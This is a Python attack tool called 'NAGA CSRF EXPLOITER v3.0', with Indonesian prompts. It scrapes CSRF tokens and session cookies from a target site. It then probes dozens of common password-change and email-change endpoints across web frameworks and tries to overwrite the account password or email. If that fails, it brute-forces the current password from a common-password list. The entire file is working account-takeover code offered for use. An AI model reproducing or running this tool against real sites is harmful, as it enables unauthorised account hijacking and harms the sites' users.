#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                    NAGA CSRF EXPLOITER v3.0                               ║
║              FULL AUTO - Endpoint Scanner + Parameter Hunter              ║
║                    Auto Detect & Auto Exploit                             ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import requests
import re
import json
import sys
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# ============== WARNA ==============
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
W = '\033[0m'
BOLD = '\033[1m'

# ============== KONFIGURASI ==============
SESSION = requests.Session()
SESSION.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive'
})

# ============== DATABASE ENDPOINT ==============
PASSWORD_ENDPOINTS = [
    # Laravel / PHP
    '/password/change', '/password/update', '/user/password', '/account/password',
    '/profile/password', '/settings/password', '/change-password', '/api/change-password',
    '/user/change-password', '/account/change-password', '/profile/change-password',
    '/settings/change-password', '/password/reset', '/password/change', '/auth/password/change',
    
    # WordPress
    '/wp-admin/profile.php', '/wp-admin/users.php?page=change-password',
    
    # Django
    '/accounts/password/change/', '/accounts/password_change/',
    
    # Spring Boot
    '/user/changePassword', '/api/user/changePassword', '/account/changePassword',
    
    # Node.js / Express
    '/user/update-password', '/api/auth/change-password', '/profile/update-password',
    
    # Generic
    '/changepass', '/changepassword', '/passchange', '/updatepass', '/newpassword',
    '/set-password', '/update-password', '/forgot-password', '/reset-password'
]

EMAIL_ENDPOINTS = [
    '/email/change', '/email/update', '/user/email', '/account/email',
    '/profile/email', '/settings/email', '/change-email', '/api/change-email',
    '/user/change-email', '/account/change-email', '/profile/change-email',
    '/email/change', '/auth/email/change', '/accounts/email/change'
]

# ============== PARAMETER VARIATIONS ==============
CSRF_PARAM_NAMES = [
    '_token', 'csrf_token', 'csrfmiddlewaretoken', 'csrf', 'xsrf-token',
    'X-CSRF-TOKEN', 'X-XSRF-TOKEN', '__RequestVerificationToken',
    'authenticity_token', 'csrf', 'token', 'csrf_key'
]

PASSWORD_PARAM_NAMES = [
    'password', 'new_password', 'newpassword', 'pass', 'passwd',
    'password_new', 'new-pass', 'pass1', 'password1', 'user_password'
]

CONFIRM_PARAM_NAMES = [
    'password_confirmation', 'confirm_password', 'password_confirm',
    'pass_confirm', 'confirm', 'retype_password', 'c_password'
]

CURRENT_PASSWORD_NAMES = [
    'current_password', 'old_password', 'oldpassword', 'current_pass',
    'old_pass', 'cur_password', 'password_old', 'current'
]

# ============== BANNER ==============
def banner():
    print(f"""
{R}╔═══════════════════════════════════════════════════════════════════════════╗
║                    {W}{BOLD} NAGA CSRF EXPLOITER v3.0 {R}                    ║
║                    {W}{BOLD}FULL AUTO - Endpoint & Parameter Hunter{W}{R}    ║
║                    {W}{BOLD}Auto Detect → Auto Test → Auto Exploit{W}{R}     ║
╚═══════════════════════════════════════════════════════════════════════════╝{W}
    """)

# ============== TOKEN EXTRACTOR ==============
class TokenHunter:
    @staticmethod
    def extract_all(html, response):
        tokens = []
        
        # From HTML meta
        meta_patterns = [
            (r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']', 'Meta: csrf-token'),
            (r'<meta[^>]*name=["\']_token["\'][^>]*content=["\']([^"\']+)["\']', 'Meta: _token'),
            (r'<meta[^>]*name=["\']XSRF-TOKEN["\'][^>]*content=["\']([^"\']+)["\']', 'Meta: XSRF-TOKEN'),
        ]
        
        for pattern, source in meta_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                tokens.append({'value': match, 'source': source})
        
        # From forms
        form_patterns = [
            (r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', 'Form: _token'),
            (r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']', 'Form: csrf_token'),
            (r'<input[^>]*name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)["\']', 'Form: csrfmiddlewaretoken'),
        ]
        
        for pattern, source in form_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                tokens.append({'value': match, 'source': source})
        
        # From cookies
        for cookie in response.cookies:
            if any(x in cookie.name.lower() for x in ['csrf', 'xsrf', 'token']):
                tokens.append({'value': cookie.value, 'source': f'Cookie: {cookie.name}'})
        
        return tokens

# ============== ENDPOINT DETECTOR ==============
class EndpointDetector:
    @staticmethod
    def test_endpoint(base_url, endpoint, token, method='POST'):
        url = urljoin(base_url, endpoint)
        
        # Try different parameter combinations
        for csrf_param in CSRF_PARAM_NAMES[:5]:
            data = {csrf_param: token}
            
            # Add random password to test
            data['password'] = 'Test123!'
            data['password_confirmation'] = 'Test123!'
            
            headers = {
                'X-CSRF-TOKEN': token,
                'X-XSRF-TOKEN': token,
                'Referer': base_url,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            try:
                if method.upper() == 'POST':
                    resp = SESSION.post(url, data=data, headers=headers, timeout=8)
                else:
                    resp = SESSION.get(url, params=data, headers=headers, timeout=8)
                
                # Check if endpoint exists
                if resp.status_code in [200, 302, 401, 403, 400]:
                    return {
                        'endpoint': endpoint,
                        'method': method,
                        'status': resp.status_code,
                        'csrf_param': csrf_param,
                        'working': resp.status_code in [200, 302]
                    }
            except:
                continue
        
        return None

# ============== MAIN EXPLOITER ==============
class CSRFExploiter:
    def __init__(self, target_url, token, session_cookie=None):
        self.target_url = target_url
        self.token = token
        self.session_cookie = session_cookie
        self.session = requests.Session()
        
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
    
    def detect_endpoints(self):
        """Scan semua endpoint yang mungkin"""
        print(f"\n{Y}[>] Scanning for password change endpoints...{W}")
        
        found_endpoints = []
        
        for endpoint in PASSWORD_ENDPOINTS:
            result = EndpointDetector.test_endpoint(self.target_url, endpoint, self.token)
            if result:
                found_endpoints.append(result)
                status_color = G if result['status'] == 200 else Y
                print(f"    {status_color}[{result['status']}]{W} {endpoint} (csrf: {result['csrf_param']})")
            time.sleep(0.3)
        
        return found_endpoints
    
    def try_exploit_with_params(self, endpoint, method, csrf_param, new_password, current_password=None):
        """Coba exploit dengan berbagai kombinasi parameter"""
        url = urljoin(self.target_url, endpoint)
        
        # Build data dictionary
        data = {csrf_param: self.token}
        
        # Try different password parameter names
        for pass_param in PASSWORD_PARAM_NAMES[:5]:
            data[pass_param] = new_password
        
        # Try different confirm parameter names
        for conf_param in CONFIRM_PARAM_NAMES[:5]:
            data[conf_param] = new_password
        
        # Try current password if provided
        if current_password:
            for curr_param in CURRENT_PASSWORD_NAMES[:5]:
                data[curr_param] = current_password
        
        headers = {
            'X-CSRF-TOKEN': self.token,
            'X-XSRF-TOKEN': self.token,
            'Referer': self.target_url,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        try:
            if method.upper() == 'POST':
                resp = self.session.post(url, data=data, headers=headers, timeout=10)
            else:
                resp = self.session.get(url, params=data, headers=headers, timeout=10)
            
            # Success indicators
            success_indicators = [
                'success', 'updated', 'changed', 'berhasil', 'Password has been changed',
                'password updated', 'password changed', 'تم التحديث', '修改成功'
            ]
            
            success = False
            for ind in success_indicators:
                if ind.lower() in resp.text.lower():
                    success = True
                    break
            
            if resp.status_code in [200, 302] and (success or 'redirect' in resp.headers.get('Location', '').lower()):
                return True, resp.status_code, data
            elif resp.status_code == 200 and len(resp.text) < 500:
                return True, resp.status_code, data
            
            return False, resp.status_code, None
        except:
            return False, None, None
    
    def change_password_auto(self, new_password, current_password=None):
        """Auto exploit - coba semua endpoint dan parameter"""
        print(f"\n{BOLD}[*] Starting auto-exploit for password change...{W}")
        
        # Step 1: Detect endpoints
        endpoints = self.detect_endpoints()
        
        if not endpoints:
            print(f"{R}[-] No active endpoints found!{W}")
            return False
        
        # Step 2: Try each endpoint
        print(f"\n{Y}[>] Trying to exploit found endpoints...{W}")
        
        for ep in endpoints:
            print(f"\n  {C}[Testing] {ep['endpoint']}{W}")
            
            success, status, used_data = self.try_exploit_with_params(
                ep['endpoint'], ep['method'], ep['csrf_param'], 
                new_password, current_password
            )
            
            if success:
                print(f"\n{G}✅ SUCCESS! Password changed at {ep['endpoint']}{W}")
                print(f"   Status: {status}")
                print(f"   Used data: {used_data}")
                return True
            else:
                print(f"  {R}Failed (Status: {status}){W}")
        
        # Step 3: If still failed, try brute force current password
        if not current_password:
            print(f"\n{Y}[!] Maybe need current password. Trying common passwords...{W}")
            common_passwords = ['123456', 'password', 'admin', '12345678', 'qwerty', 'abc123', '111111', 'test']
            
            for guess in common_passwords:
                print(f"  Trying current password: {guess}...", end=' ')
                for ep in endpoints:
                    success, status, _ = self.try_exploit_with_params(
                        ep['endpoint'], ep['method'], ep['csrf_param'],
                        new_password, guess
                    )
                    if success:
                        print(f"{G}SUCCESS!{W}")
                        print(f"{G}✅ Current password was: {guess}{W}")
                        return True
                print(f"{R}Failed{W}")
        
        return False
    
    def change_email_auto(self, new_email):
        """Auto exploit untuk change email"""
        print(f"\n{BOLD}[*] Starting auto-exploit for email change...{W}")
        
        for endpoint in EMAIL_ENDPOINTS:
            url = urljoin(self.target_url, endpoint)
            
            for csrf_param in CSRF_PARAM_NAMES[:5]:
                data = {csrf_param: self.token, 'email': new_email, 'email_confirmation': new_email}
                headers = {'X-CSRF-TOKEN': self.token, 'Referer': self.target_url}
                
                try:
                    resp = self.session.post(url, data=data, headers=headers, timeout=8)
                    if resp.status_code in [200, 302]:
                        print(f"{G}✅ SUCCESS! Email changed at {endpoint}{W}")
                        return True
                except:
                    continue
        
        return False

# ============== SESSION EXTRACTOR ==============
class SessionExtractor:
    @staticmethod
    def extract_session_cookies(response):
        sessions = []
        for cookie in response.cookies:
            if any(x in cookie.name.lower() for x in ['session', 'sid', 'auth', 'jwt', 'token']):
                sessions.append({'name': cookie.name, 'value': cookie.value})
        return sessions

# ============== MAIN ==============
class NagaCSRFExploiter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.tokens = []
        self.sessions = []
    
    def run(self):
        banner()
        print(f"{BOLD}[*] Target: {self.target}{W}\n")
        
        # Step 1: Fetch page
        print(f"{Y}[>] Fetching target page...{W}")
        try:
            resp = SESSION.get(self.target, timeout=15)
            html = resp.text
            print(f"{G}[✓] Page loaded (Status: {resp.status_code}){W}\n")
        except Exception as e:
            print(f"{R}[✗] Failed: {str(e)}{W}")
            return
        
        # Step 2: Extract tokens
        print(f"{BOLD}[1] Extracting Tokens...{W}")
        hunter = TokenHunter()
        self.tokens = hunter.extract_all(html, resp)
        
        if self.tokens:
            print(f"{G}[+] Found {len(self.tokens)} tokens:{W}")
            for t in self.tokens[:3]:
                print(f"    - {t['source']}: {t['value'][:40]}...")
        else:
            print(f"{Y}[-] No tokens found{W}")
        
        # Step 3: Extract sessions
        print(f"\n{BOLD}[2] Extracting Session Cookies...{W}")
        session_extractor = SessionExtractor()
        self.sessions = session_extractor.extract_session_cookies(resp)
        
        if self.sessions:
            print(f"{G}[+] Found {len(self.sessions)} session cookies:{W}")
            for s in self.sessions:
                print(f"    - {s['name']}: {s['value'][:30]}...")
        
        # Step 4: Choose exploitation
        if self.tokens:
            token = self.tokens[0]['value']
            session_cookie = self.sessions[0]['value'] if self.sessions else None
            
            exploiter = CSRFExploiter(self.target, token, session_cookie)
            
            print(f"""
{BOLD}{'='*60}{W}
{BOLD}💀 CSRF EXPLOITATION MENU (AUTO MODE){W}
{BOLD}{'='*60}{W}

    {G}1.{W} Change Password (AUTO - Scan & Exploit)
    {G}2.{W} Change Email (AUTO - Scan & Exploit)
    {G}3.{W} Change Password with Known Current Password
    {G}4.{W} Skip

            """)
            
            choice = input(f"{BOLD}[?] Pilih (1-4): {W}").strip()
            
            if choice == '1':
                new_pass = input(f"{Y}[?] New password: {W}")
                if new_pass:
                    success = exploiter.change_password_auto(new_pass)
                    if success:
                        print(f"\n{G}🎉 PASSWORD CHANGE SUCCESSFUL!{W}")
                        print(f"{R}⚠️  New password: {new_pass}{W}")
                    else:
                        print(f"\n{R}❌ PASSWORD CHANGE FAILED{W}")
                        print(f"{Y}💡 Possible reasons: Requires 2FA, Captcha, or Email confirmation{W}")
            
            elif choice == '2':
                new_email = input(f"{Y}[?] New email: {W}")
                if new_email:
                    success = exploiter.change_email_auto(new_email)
                    if success:
                        print(f"\n{G}🎉 EMAIL CHANGE SUCCESSFUL!{W}")
                    else:
                        print(f"\n{R}❌ EMAIL CHANGE FAILED{W}")
            
            elif choice == '3':
                new_pass = input(f"{Y}[?] New password: {W}")
                curr_pass = input(f"{Y}[?] Current password: {W}")
                if new_pass and curr_pass:
                    success = exploiter.change_password_auto(new_pass, curr_pass)
                    if success:
                        print(f"\n{G}🎉 PASSWORD CHANGE SUCCESSFUL!{W}")
                    else:
                        print(f"\n{R}❌ PASSWORD CHANGE FAILED{W}")
        
        print(f"\n{G}[✓] Scan completed!{W}")

# ============== MAIN ENTRY ==============
if __name__ == "__main__":
    try:
        if len(sys.argv) > 1:
            target = sys.argv[1]
        else:
            target = input(f"{BOLD}[?] Masukkan target URL: {W}")
        
        if not target.startswith('http'):
            target = 'https://' + target
        
        exploiter = NagaCSRFExploiter(target)
        exploiter.run()
        
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted by user{W}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[-] Error: {str(e)}{W}")
        sys.exit(1)
